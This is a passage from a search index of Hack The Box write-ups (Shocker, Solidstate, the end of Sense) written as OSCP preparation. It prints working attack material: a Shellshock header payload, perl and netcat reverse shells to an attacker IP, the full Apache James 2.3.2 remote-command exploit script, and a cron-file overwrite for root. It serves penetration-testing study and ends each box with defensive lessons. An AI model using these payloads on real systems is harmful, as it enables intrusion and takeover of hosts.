publicly store sensitive information. Use of default credentials. The user used the default password that is shipped with the application. Since default credentials are publicly available and can be easily obtained, the user should have instead used a sufficiently long password that is difficult to crack. Command injection in the pfSense software that allowed us to send a shell back to our attack server. This could have been avoided if the user had patched the system and installed the most recent version of pfSense. As mentioned earlier, we didn\u2019t have to escalate privileges for this box since pfSense runs with root privileges and therefore we got a shell with root privileges.","title":"Lessons Learned"},{"location":"Retired/Sense Writeup wo Metasploit/#conclusion","text":"18 machines down, 29 more to go!","title":"Conclusion"},{"location":"Retired/Shocker Writeup wo Metasploit/","text":"This is the 7th blog out of a series of blogs I will be publishing on retired HTB machines in preparation for the OSCP. The full list of OSCP like machines compiled by TJnull can be found here . Let\u2019s get started! Reconnaissance First thing first, we run a quick initial nmap scan to see which ports are open and which services are running on those ports. nmap -sC -sV -O -oA htb/shocker/nmap/initial 10.10.10.56 -sC : run default nmap scripts -sV : detect service version -O : detect OS -oA : output all formats and store in file nmap/initial We get back the following result showing that two ports are open: Port 80: running Apache httpd 2.4.18 Port 2222 : running OpenSSH 7.2p2 Before we start investigating these ports, let\u2019s run more comprehensive nmap scans in the background to make sure we cover all bases. Let\u2019s run an nmap scan that covers all ports. nmap -sC -sV -O -p- -oA htb/shocker/nmap/full 10.10.10.56 We get back the following result. No other ports are open. Similarly, we run an nmap scan with the -sU flag enabled to run a UDP scan. nmap -sU -O -p- -oA htb/shocker/nmap/udp 10.10.10.56 I managed to root the box and write this blog, while this UDP scan still did not terminate. So for this blog, I don\u2019t have the UDP scan results. Enumeration Let\u2019s enumerate more on the open ports. SearchSploit does not generate any useful exploits that we can use. searchsploit --id httpd searchsploit --id openssh 7.2p2 Next, visit the Apache server on the browser. We get a page that does not have links to any other pages. Therefore, we\u2019ll run Gobuster to enumerate directories. gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.56 This leads us to another dead end. It only discovered one directory that we don\u2019t have access to. Given the name of the machine, I have a suspicion that it is vulnerable to the Shellshock bash remote code execution vulnerability. This vulnerability affected web servers utilizing CGI (Common Gateway Interface), which is a system for generating dynamic web content. This usually involved directories such as /cgi-sys, /cgi-mod, /cgi-bin, etc. I\u2019ll manually try them on the web server to see if they exist. /cgi-sys and /cgi-mod do not exist on the web server. However /cgi-bin does. It was interesting to note the behaviour of the web server when I add /cgi-bin versus /cgi-bin/ to the URL path. /cgi-bin/ gave me a 403 (you don\u2019t have access to this resource) and /cgi-bin gave me a 404 (resource not found). It seems that if we don\u2019t add the \u201c/\u201d at the end of the URL, the server is interpreting it as a file instead of a directory (maybe, I\u2019m not too sure). Now it makes sense why Gobuster did not find the directory. It checked the url \u201c10.10.10.56/cgi-bin\u201d, got a 404 and therefore didn\u2019t report it. The \u201c-f\u201d flag appends \u201c/\u201d to each request. So let\u2019s run Gobuster again. gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.56 -f It finds the directory! Now we need to enumerate more on the /cgi-bin/ directory. I\u2019ll look for files with extensions \u201csh\u201d and \u201ccgi\u201d. gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.56/cgi-bin/ -x sh,cgi -x : file extensions to search for I get back a bash script (user.sh). When I visit the URL, it prompts me to download the file. Opening the file shows us the following content. Fire up burp and intercept the request to the bash script. The send it to Repeater. The above image shows the request to the bash script and the response we get from the server. Now let\u2019s try to see if it is vulnerable to shellshock. Gaining an Initial Foothold I googled \u201cshellshock reverse shell\u201d and found this blog explaining how to exploit the shellshock vulnerability to get a reverse shell on the system the web server is running on. First add the following string in the User Agent field in Burp. () { ignored;};/bin/bash -i /dev/10.10.14.6/4444/port 0 1 Then start up a listener on your attack machine using the same configuration in the above string. nc -nlvp 4444 Go back to Burp and execute the request. Burp shouldn\u2019t give you a response if the exploit worked. Go back to your listener and check if you got a shell back. We got back a low privileged shell! Grab the user flag. It\u2019s time to escalate privileges. Privilege Escalation Run the following command to determine what permissions you have. sudo -l Yikes, I can run perl as root! Well, it\u2019s yay for me and yikes for the system administrator. If I use perl to send a reverse shell back to my machine it will get executed with the same privileges that perl is running in. So if I run perl with sudo privileges, I\u2019ll get back a reverse shell with root privileges. Go to pentestmonkey and grab the perl code for a reverse shell. Don\u2019t forget to add sudo at the beginning. sudo perl -e use Socket;$i= 10.10.14.6 ;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname( tcp ));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN, S );open(STDOUT, S );open(STDERR, S );exec( /bin/sh -i );}; Before you execute the code, start up a listener on your attack machine with the same configuration as the above code. nc -nlvp 1234 Execute the code and we have root! Grab the root flag. Lessons Learned I\u2019ve never seen or had to use the \u201c-f\u201d flag with Gobuster, so that was something new that I learned while solving this box. I\u2019ll definitely keep it in mind when I solve future boxes. As for vulnerabilities, I counted three. The first being a web server insecure misconfiguration. I wasn\u2019t allowed to access the /cgi-bin directory but for some reason I was allowed to access the user.sh file inside of that directory. The administrator should have restricted access to all the files in the directory. The second vulnerability is that the web server was executing bash commands on a system that was running a version of Bash that was vulnerable to the Shellshock vulnerability. This allowed us to gain initial access to the system. Of course a patch is available and the administrator should have patched his system. The third vulnerability is insecure system configuration. You should always conform to the principle of least privilege and the concept of separation of privileges. Giving the user sudo access to run perl, allowed me (the attacker) to escalate privileges. Conclusion 7 machines down, 34 more to go!","title":"21. Shocker Writeup w/o Metasploit.md"},{"location":"Retired/Shocker Writeup wo Metasploit/#reconnaissance","text":"First thing first, we run a quick initial nmap scan to see which ports are open and which services are running on those ports. nmap -sC -sV -O -oA htb/shocker/nmap/initial 10.10.10.56 -sC : run default nmap scripts -sV : detect service version -O : detect OS -oA : output all formats and store in file nmap/initial We get back the following result showing that two ports are open: Port 80: running Apache httpd 2.4.18 Port 2222 : running OpenSSH 7.2p2 Before we start investigating these ports, let\u2019s run more comprehensive nmap scans in the background to make sure we cover all bases. Let\u2019s run an nmap scan that covers all ports. nmap -sC -sV -O -p- -oA htb/shocker/nmap/full 10.10.10.56 We get back the following result. No other ports are open. Similarly, we run an nmap scan with the -sU flag enabled to run a UDP scan. nmap -sU -O -p- -oA htb/shocker/nmap/udp 10.10.10.56 I managed to root the box and write this blog, while this UDP scan still did not terminate. So for this blog, I don\u2019t have the UDP scan results.","title":"Reconnaissance"},{"location":"Retired/Shocker Writeup wo Metasploit/#enumeration","text":"Let\u2019s enumerate more on the open ports. SearchSploit does not generate any useful exploits that we can use. searchsploit --id httpd searchsploit --id openssh 7.2p2 Next, visit the Apache server on the browser. We get a page that does not have links to any other pages. Therefore, we\u2019ll run Gobuster to enumerate directories. gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.56 This leads us to another dead end. It only discovered one directory that we don\u2019t have access to. Given the name of the machine, I have a suspicion that it is vulnerable to the Shellshock bash remote code execution vulnerability. This vulnerability affected web servers utilizing CGI (Common Gateway Interface), which is a system for generating dynamic web content. This usually involved directories such as /cgi-sys, /cgi-mod, /cgi-bin, etc. I\u2019ll manually try them on the web server to see if they exist. /cgi-sys and /cgi-mod do not exist on the web server. However /cgi-bin does. It was interesting to note the behaviour of the web server when I add /cgi-bin versus /cgi-bin/ to the URL path. /cgi-bin/ gave me a 403 (you don\u2019t have access to this resource) and /cgi-bin gave me a 404 (resource not found). It seems that if we don\u2019t add the \u201c/\u201d at the end of the URL, the server is interpreting it as a file instead of a directory (maybe, I\u2019m not too sure). Now it makes sense why Gobuster did not find the directory. It checked the url \u201c10.10.10.56/cgi-bin\u201d, got a 404 and therefore didn\u2019t report it. The \u201c-f\u201d flag appends \u201c/\u201d to each request. So let\u2019s run Gobuster again. gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.56 -f It finds the directory! Now we need to enumerate more on the /cgi-bin/ directory. I\u2019ll look for files with extensions \u201csh\u201d and \u201ccgi\u201d. gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.56/cgi-bin/ -x sh,cgi -x : file extensions to search for I get back a bash script (user.sh). When I visit the URL, it prompts me to download the file. Opening the file shows us the following content. Fire up burp and intercept the request to the bash script. The send it to Repeater. The above image shows the request to the bash script and the response we get from the server. Now let\u2019s try to see if it is vulnerable to shellshock.","title":"Enumeration"},{"location":"Retired/Shocker Writeup wo Metasploit/#gaining-an-initial-foothold","text":"I googled \u201cshellshock reverse shell\u201d and found this blog explaining how to exploit the shellshock vulnerability to get a reverse shell on the system the web server is running on. First add the following string in the User Agent field in Burp. () { ignored;};/bin/bash -i /dev/10.10.14.6/4444/port 0 1 Then start up a listener on your attack machine using the same configuration in the above string. nc -nlvp 4444 Go back to Burp and execute the request. Burp shouldn\u2019t give you a response if the exploit worked. Go back to your listener and check if you got a shell back. We got back a low privileged shell! Grab the user flag. It\u2019s time to escalate privileges.","title":"Gaining an Initial Foothold"},{"location":"Retired/Shocker Writeup wo Metasploit/#privilege-escalation","text":"Run the following command to determine what permissions you have. sudo -l Yikes, I can run perl as root! Well, it\u2019s yay for me and yikes for the system administrator. If I use perl to send a reverse shell back to my machine it will get executed with the same privileges that perl is running in. So if I run perl with sudo privileges, I\u2019ll get back a reverse shell with root privileges. Go to pentestmonkey and grab the perl code for a reverse shell. Don\u2019t forget to add sudo at the beginning. sudo perl -e use Socket;$i= 10.10.14.6 ;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname( tcp ));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN, S );open(STDOUT, S );open(STDERR, S );exec( /bin/sh -i );}; Before you execute the code, start up a listener on your attack machine with the same configuration as the above code. nc -nlvp 1234 Execute the code and we have root! Grab the root flag.","title":"Privilege Escalation"},{"location":"Retired/Shocker Writeup wo Metasploit/#lessons-learned","text":"I\u2019ve never seen or had to use the \u201c-f\u201d flag with Gobuster, so that was something new that I learned while solving this box. I\u2019ll definitely keep it in mind when I solve future boxes. As for vulnerabilities, I counted three. The first being a web server insecure misconfiguration. I wasn\u2019t allowed to access the /cgi-bin directory but for some reason I was allowed to access the user.sh file inside of that directory. The administrator should have restricted access to all the files in the directory. The second vulnerability is that the web server was executing bash commands on a system that was running a version of Bash that was vulnerable to the Shellshock vulnerability. This allowed us to gain initial access to the system. Of course a patch is available and the administrator should have patched his system. The third vulnerability is insecure system configuration. You should always conform to the principle of least privilege and the concept of separation of privileges. Giving the user sudo access to run perl, allowed me (the attacker) to escalate privileges.","title":"Lessons Learned"},{"location":"Retired/Shocker Writeup wo Metasploit/#conclusion","text":"7 machines down, 34 more to go!","title":"Conclusion"},{"location":"Retired/Solidstate Writeup wo Metasploit/","text":"This is the 19th blog out of a series of blogs I will be publishing on retired HTB machines in preparation for the OSCP. The full list of OSCP like machines compiled by TJ_Null can be found here . Let\u2019s get started! Reconnaissance First thing first, we run a quick initial nmap scan to see which ports are open and which services are running on those ports. nmap -sC -sV -O -oA initial 10.10.10.51 -sC : run default nmap scripts -sV : detect service version -O : detect OS -oA : output all formats and store in file initial We get back the following result showing that 5 ports are open: Port 22: running OpenSSH 7.4p1 Port 25: running JAMES smtpd 2.3.2 Port 80: running httpd 2.4.25 Port 110: running JAMES pop3d 2.3.2 Port 119: running JAMES nntpd Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) ) at 2019-12-29 17:22 EST Nmap scan report for 10.10.10.51 Host is up (0.039s latency). Not shown: 995 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0) | ssh-hostkey: | 2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA) | 256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA) |_ 256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519) 25/tcp open smtp JAMES smtpd 2.3.2 |_smtp-commands: solidstate Hello nmap.scanme.org (10.10.14.12 [10.10.14.12]), 80/tcp open http Apache httpd 2.4.25 ((Debian)) |_http-server-header: Apache/2.4.25 (Debian) |_http-title: Home - Solid State Security 110/tcp open pop3 JAMES pop3d 2.3.2 119/tcp open nntp JAMES nntpd (posting ok) No exact OS matches for host (If you know what OS is running on it, see [https://nmap.org/submit/](https://nmap.org/submit/) ). TCP/IP fingerprint: OS:SCAN(V=7.80%E=4%D=12/29%OT=22%CT=1%CU=39873%PV=Y%DS=2%DC=I%G=Y%TM=5E0927 OS:3F%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10D%TI=Z%CI=I%II=I%TS=8)OP OS:S(O1=M54DST11NW6%O2=M54DST11NW6%O3=M54DNNT11NW6%O4=M54DST11NW6%O5=M54DST OS:11NW6%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)EC OS:N(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F= OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5( OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z% OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C OS:D=S) Network Distance: 2 hops Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel OS and Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) . Nmap done: 1 IP address (1 host up) scanned in 32.57 seconds Before we start investigating these ports, let\u2019s run more comprehensive nmap scans in the background to make sure we cover all bases. Let\u2019s run an nmap scan that covers all ports. nmap -sC -sV -p- -oA full 10.10.10.51 We get back the following result showing that one other port is open. Port 4555: running JAMES Remote Admin 2.3.2 Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) ) at 2019-12-29 17:26 EST Nmap scan report for 10.10.10.51 Host is up (0.052s latency). Not shown: 65529 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0) | ssh-hostkey: | 2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA) | 256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA) |_ 256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519) 25/tcp open smtp JAMES smtpd 2.3.2 |_smtp-commands: solidstate Hello nmap.scanme.org (10.10.14.12 [10.10.14.12]), 80/tcp open http Apache httpd 2.4.25 ((Debian)) |_http-server-header: Apache/2.4.25 (Debian) |_http-title: Home - Solid State Security 110/tcp open pop3 JAMES pop3d 2.3.2 119/tcp open nntp JAMES nntpd (posting ok) 4555/tcp open james-admin JAMES Remote Admin 2.3.2 Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) . Nmap done: 1 IP address (1 host up) scanned in 75.55 seconds Similarly, we run an nmap scan with the -sU flag enabled to run a UDP scan. nmap -sU -p- -oA udp 10.10.10.51 I managed to root the box and write this blog while the UDP scan did not terminate. So I don\u2019t have UDP nmap scan results for this box. Before we move on to enumeration, let\u2019s make some mental notes about the nmap scan results. The OpenSSH version that is running on port 22 is not associated with any critical vulnerabilities, so it\u2019s unlikely that we gain initial access through this port, unless we find credentials. Ports 80 is running a web server, so we\u2019ll perform our standard enumeration techniques on it. Ports 25, 110, 119 and 4555 are running Apache James. Apache James is an open source SMTP and POP3 mail transfer agent and NNTP news server. Port 4555 immediately catches my eye since it\u2019s a remote administration tool. We\u2019ll need to run searchsploit on it to check if it is associated with any critical vulnerabilities. Enumeration I always start off with enumerating HTTP first. Port 80 Visit the application in the browser. I visited all the pages in the application and didn\u2019t find anything useful. Next, let\u2019s run gobuster. gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u 10.10.10.51 dir: uses directory/file brute forcing mode -w: path to the wordlist -u: target URL or domain We get back the following result. =============================================================== Gobuster v3.0.1 by OJ Reeves ([@TheColonial](http://twitter.com/TheColonial)) Christian Mehlmauer ([@_FireFart_](http://twitter.com/_FireFart_)) =============================================================== [+] Url: [http://10.10.10.51](http://10.10.10.51) [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2019/12/29 17:31:19 Starting gobuster =============================================================== /images (Status: 301) /assets (Status: 301) /server-status (Status: 403) =============================================================== 2019/12/29 17:56:46 Finished =============================================================== Nothing useful, so let\u2019s move on to enumerating port 4555. Port 4555 Run searchsploit on the software name and version. searchsploit Apache James Server 2.3.2 We get back the following result. Jackpot! Transfer the exploit to our current directory. searchsploit -m 35513 You should never run scripts that you haven\u2019t reviewed first, so let\u2019s view the content of this exploit. `#!/usr/bin/python # # Exploit Title: Apache James Server 2.3.2 Authenticated User Remote Command Execution # Date: 16\\10\\2014 # Exploit Author: Jakub Palaczynski, Marcin Woloszyn, Maciej Grabiec # Vendor Homepage: http://james.apache.org/server/ # Software Link: http://ftp.ps.pl/pub/apache/james/server/apache-james-2.3.2.zip # Version: Apache James Server 2.3.2 # Tested on: Ubuntu, Debian # Info: This exploit works on default installation of Apache James Server 2.3.2 # Info: Example paths that will automatically execute payload on some action: /etc/bash_completion.d , /etc/pm/config.d import socket import sys import time # specify payload #payload = touch /tmp/proof.txt # to exploit on any user payload = [ $(id -u) == 0 ] touch /root/proof.txt # to exploit only on root # credentials to James Remote Administration Tool (Default - root/root) user = root pwd = root if len(sys.argv) != 2: sys.stderr.write( [-]Usage: python %s ip \\n % sys.argv[0]) sys.stderr.write( [-]Exemple: python %s 127.0.0.1\\n % sys.argv[0]) sys.exit(1) ip = sys.argv[1] def recv(s): s.recv(1024) time.sleep(0.2) try: print [+]Connecting to James Remote Administration Tool... s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.connect((ip,4555)) s.recv(1024) s.send(user + \\n ) s.recv(1024) s.send(pwd + \\n ) s.recv(1024) print [+]Creating user... s.send( adduser ../../../../../../../../etc/bash_completion.d exploit\\n ) s.recv(1024) s.send( quit\\n ) s.close() print [+]Connecting to James SMTP server... s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.connect((ip,25)) s.send( ehlo team@team.pl\\r\\n ) recv(s) print [+]Sending payload... s.send( mail from: @team.pl \\r\\n ) recv(s) # also try s.send( rcpt to: ../../../../../../../../etc/bash_completion.d@hostname \\r\\n ) if the recipient cannot be found s.send( rcpt to: ../../../../../../../../etc/bash_completion.d \\r\\n ) recv(s) s.send( data\\r\\n ) recv(s) s.send( From: team@team.pl\\r\\n ) s.send( \\r\\n ) s.send( \\n ) s.send(payload + \\n ) s.send( \\r\\n.\\r\\n ) recv(s) s.send( quit\\r\\n ) recv(s) s.close() print [+]Done! Payload will be executed once somebody logs in. except: print Connection failed. ` After reviewing the script, I made a few notes: This is an authenticated exploit, so we need credentials. The exploit uses the default credentials root/root that are probably shipped with the software. We\u2019ll have to connect to the server to find out if these credentials are valid before we run this exploit. When running the exploit we have to pass the IP address as an argument. The script by default connects to port 4555 which is good since our server is running on that port. The script first creates a user with username \u201c../../../../../../../../etc/bash_completion.d\u201d and password \u201cexploit\u201d. It then connects to the SMTP server and sends that user a payload. Right off the bat, this doesn\u2019t make much sense, so we\u2019ll have to research the vulnerability. After a bit of research we find that the vulnerability is in the adduser functionality. When a new user is added, the server creates a new subdirectory to store incoming and outgoing emails for that user. However, the username field is not properly validated. Therefore, when we\u2019re creating a user with the username \u201c../../../../../../../../etc/bash_completion.d\u201d, any mail that gets sent to that user will be stored in that directory path. Why is that dangerous? Long story short, anything under the directory /etc/bash_completion.d is automatically loaded by Bash for all users! To learn more about bash completion scripts, refer to this article . Therefore, if we create a user with a username that leads to the /etc/bash_completion.d directory, when we send an email to that user, our email gets saved in the bash_completion.d directory and the content of our email is automatically loaded by Bash when any user logs into the machine. So if we include a reverse shell in the email, all we have to do is wait for a single user to log in and we have access to the machine! Now that we\u2019ve done our research, we\u2019re ready to move on to the exploitation phase. Initial Foothold First, let\u2019s test the root/root credentials on the James Remote Admin server. root@kali:~/Desktop/htb/solidstate# nc 10.10.10.51 4555 JAMES Remote Administration Tool 2.3.2 Please enter your login and password Login id: root Password: root Welcome root. HELP for a list of commands It works, good! List the available commands using the HELP command. HELP Currently implemented commands: help display this help listusers display existing accounts countusers display the number of existing accounts adduser [username] [password] add a new user verify [username] verify if specified user exist deluser [username] delete existing user setpassword [username] [password] sets a user s password setalias [user] [alias] locally forwards all email for user to alias showalias [username] shows a user s current email alias unsetalias [user] unsets an alias for user setforwarding [username] [emailaddress] forwards a user s email to another email address showforwarding [username] shows a user s current email forwarding unsetforwarding [username] removes a forward user [repositoryname] change to another user repository shutdown kills the current JVM (convenient when James is run as a daemon) quit close connection Use the listusers command to display existing accounts. listusers Existing accounts 5 user: james user: thomas user: john user: mindy user: mailadmin We have 5 accounts. Since this is an admin account, we can set a user\u2019s password and then access their account. If this was a real penetration test, you probably don\u2019t want to do that. You\u2019ll raise a lot of red flags when a bunch of users no longer can access their accounts. However, since this is a practice environment, I\u2019m going to go all out. Let\u2019s start by changing the mailadmin user\u2019s account. setpassword mailadmin password Password for mailadmin reset Now that we reset the password for the mailadmin account, let\u2019s access his email using telnet. root@kali:~# telnet 10.10.10.51 110 Trying 10.10.10.51... Connected to 10.10.10.51. Escape character is ^] . +OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready USER mailadmin +OK PASS password +OK Welcome mailadmin LIST +OK 0 0 . He does not have any mail. Next, I\u2019m going to reset the passwords of all the other accounts. setpassword james password Password for james reset setpassword thomas password Password for thomas reset setpassword john password Password for john reset setpassword mindy password Password for mindy reset James, Thomas and John didn\u2019t have any emails too. Mindy on the other hand had two emails stored in her account. root@kali:~# telnet 10.10.10.51 110 Trying 10.10.10.51... Connected to 10.10.10.51. Escape character is ^] . +OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready USER mindy +OK PASS password +OK Welcome mindy LIST +OK 2 1945 1 1109 2 836 . RETR 1 +OK Message follows Return-Path: mailadmin@localhost Message-ID: 5420213.0.1503422039826.JavaMail.root@solidstate MIME-Version: 1.0 Content-Type: text/plain; charset=us-ascii Content-Transfer-Encoding: 7bit Delivered-To: mindy@localhost Received: from 192.168.11.142 ([192.168.11.142]) by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 798 for mindy@localhost ; Tue, 22 Aug 2017 13:13:42 -0400 (EDT) Date: Tue, 22 Aug 2017 13:13:42 -0400 (EDT) From: mailadmin@localhost Subject: Welcome Dear Mindy, Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critical in fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduction to Cyber Security and provide resources that will help you make a smooth transition into your new role. The Cyber team is here to support your transition so, please know that you can call on any of us to assist you. We are looking forward to you joining our team and your success at Solid State Security. Respectfully, James . RETR 2 +OK Message follows Return-Path: mailadmin@localhost Message-ID: 16744123.2.1503422270399.JavaMail.root@solidstate MIME-Version: 1.0 Content-Type: text/plain; charset=us-ascii Content-Transfer-Encoding: 7bit Delivered-To: mindy@localhost Received: from 192.168.11.142 ([192.168.11.142]) by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581 for mindy@localhost ; Tue, 22 Aug 2017 13:17:28 -0400 (EDT) Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT) From: mailadmin@localhost Subject: Your Access Dear Mindy, Here are your ssh credentials to access the system. Remember to reset your password after your first login. Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. username: mindy pass: P@55W0rd1!2@ Respectfully, James The first email was useless but the second email gives us SSH credentials! Let\u2019s SSH into Mindy\u2019s account. root@kali:~# ssh mindy@10.10.10.51 The authenticity of host 10.10.10.51 (10.10.10.51) can t be established. ECDSA key fingerprint is SHA256:njQxYC21MJdcSfcgKOpfTedDAXx50SYVGPCfChsGwI0. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added 10.10.10.51 (ECDSA) to the list of known hosts. mindy@10.10.10.51 s password: Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Tue Aug 22 14:00:02 2017 from 192.168.11.142 mindy@solidstate:~$ whoami -rbash: whoami: command not found We\u2019re in! However, we seem to be in a restricted bash shell (rbash). A restricted shell is a shell that restricts a user by blocking/restricting some of the commands. That\u2019s why the \u201cwhoami\u201d command didn\u2019t work for us. The \u201cls\u201d and \u201ccat\u201d commands work, so we can at least view the user.txt flag. There are several things you can do to try and break out of a restricted shell. I tried a bunch of them, but nothing worked. I\u2019m not even allowed to change directories! mindy@solidstate:~$ cd /home -rbash: cd: restricted We seem to have reached a dead end, so let\u2019s go back to the RCE exploit we found earlier. I\u2019m going to exploit this manually instead of using the script on exploitdb. Log back into the James Remote Admin server and create a user with the username \u201c../../../../../../../../etc/bash_completion.d\u201d and password \u201cpassword\u201d. root@kali:~/Desktop/htb/solidstate# nc 10.10.10.51 4555 JAMES Remote Administration Tool 2.3.2 Please enter your login and password Login id: root Password: root Welcome root. HELP for a list of commands adduser ../../../../../../../../etc/bash_completion.d password User ../../../../../../../../etc/bash_completion.d added Now let\u2019s send this user an email that contains a reverse shell. root@kali:~# telnet 10.10.10.51 25 Trying 10.10.10.51... Connected to 10.10.10.51. Escape character is ^] . 220 solidstate SMTP Server (JAMES SMTP Server 2.3.2) ready Mon, 30 Dec 2019 17:10:56 -0500 (EST) EHLO bla.bla 250-solidstate Hello bla.bla (10.10.14.12 [10.10.14.12]) 250-PIPELINING 250 ENHANCEDSTATUSCODES MAIL FROM: [random@random.com](mailto:random@random.com) 250 2.1.0 Sender [random@random.com](mailto:random@random.com) OK RCPT TO: ../../../../../../../../etc/bash_completion.d 250 2.1.5 Recipient ../../../../../../../../etc/bash_completion.d@localhost OK DATA 354 Ok Send data ending with CRLF . CRLF FROM: bla.bla /bin/nc -e /bin/bash 10.10.14.12 1234 . 250 2.6.0 Message received quit 221 2.0.0 solidstate Service closing transmission channel Connection closed by foreign host. If you\u2019re not familiar with using telnet for SMTP communication, refer to this guide . One thing to note is the single quote we added in the MAIL FROM field and after the FROM field. This is so that the file is interpreted properly at the backend and our reverse shell runs. Next, set up a listener to receive the reverse shell. nc -nlvp 1234 Then SSH into Mindy\u2019s account so that the content of the bash_completion directory is loaded. ssh mindy@10.10.10.51 We get a shell that\u2019s no longer restricted by the rbash shell! Let\u2019s upgrade it to a better shell. python -c import pty; pty.spawn( /bin/bash ) This gives us a partially interactive bash shell. To get a fully interactive shell, background the session (CTRL+ Z) and run the following in your terminal which tells your terminal to pass keyboard shortcuts to the shell. stty raw -echo Once that is done, run the command \u201cfg\u201d to bring netcat back to the foreground. Now we need to escalate privileges. Privilege Escalation Let\u2019s transfer the LinEnum script from our attack machine to the target machine. In the attack machine, start up a server in the same directory that the script resides in. python -m SimpleHTTPServer 5555 In the target machine, move to the /tmp directory where we have write privileges and download the LinEnum script. cd /tmp wget [http://10.10.14.12:5555/LinEnum.sh](http://10.10.14.6:5555/LinEnum.sh) Give it execute privileges. chmod +x LinEnum.sh Run the script. ./LinEnum.sh We don\u2019t get anything useful. Next, let\u2019s try pspy. If you don\u2019t have the script, you can download it from the following github repository. [https://github.com/DominicBreuker/pspy](https://github.com/DominicBreuker/pspy) We know that the system is a 32 bit system so make sure you run pspy32. Upload it and run it on the attack machine in the same way we did for LinEnum. After a minute we see an interesting process pop up. If you view the permissions on the /opt/tmp.py file, you\u2019ll see that everyone has read/write/execute privileges on it. Therefore all we need to do is change the content of the file to send a reverse shell to our attack machine and then we simply wait for the cron job to send a privileged shell back. Change the content of the file to send a reverse shell to our attack machine. echo os.system( /bin/nc -e /bin/bash 10.10.14.12 7777 ) /opt/tmp.py Set up a listener to receive the reverse shell. nc -nlvp 7777 Wait a minute for the cron job to run. We have a shell! Grab the root.txt flag. Lessons Learned To gain an initial foothold on the box we exploited three vulnerabilities. Use of default credentials. The administrator used the default password that is shipped with the application. Since default credentials are publicly available and can be easily obtained, the user should have instead used a sufficiently long password that is difficult to crack. Information disclosure. SSH credentials are stored in plaintext in one of the user\u2019s emails. If it is necessary that the password be transmitted by email, the user should have changed the password upon the first login. A Remote Code Execution (RCE) vulnerability with the James Remote server that allowed us to gain initial access to the machine. This could have been avoided if the user had patched the system and installed the most recent version of the software. To escalate privileges we exploited one vulnerability. A security misconfiguration of file permissions. There was a scheduled task that ran a file with root privileges although everyone had write access to that file. This allowed us to change the content of the file and get a privileged reverse shell sent back to our attack machine. To avoid this vulnerability, the file permissions should have been restricted to only root level access. Conclusion 19 machines down, 28 more to go!","title":"28. Solidstate Writeup w/o Metasploit.md"},{"location":"Retired/Solidstate Writeup wo Metasploit/#reconnaissance","text":"First thing first, we run a quick initial nmap scan to see which ports are open and which services are running on those ports. nmap -sC -sV -O -oA initial 10.10.10.51 -sC : run default nmap scripts 